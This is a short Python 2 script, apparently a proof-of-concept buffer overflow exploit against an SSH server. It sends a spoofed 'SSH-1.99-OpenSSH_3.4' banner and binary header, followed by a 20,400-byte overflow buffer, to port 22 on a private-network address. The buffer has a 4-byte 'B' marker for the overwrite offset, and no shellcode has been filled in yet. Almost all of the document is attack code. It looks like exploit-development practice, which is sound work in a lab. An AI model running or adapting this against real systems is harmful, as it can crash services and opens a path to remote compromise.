#!/usr/bin/python

import sys, socket


Pre= ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
       "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")

buffer = "A" * 1055 + "B" * 4 

buffer += "C" * (20400-len(buffer))

eob = "\r\n"


try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.43.156',22))
    print "Sending paylaod to remote server....."
    s.send((Pre + buffer + eob))
    s.recv(1024)
    s.close()
                      
except: 
    print("unable to connect remoter server....")
    sys.exit() 








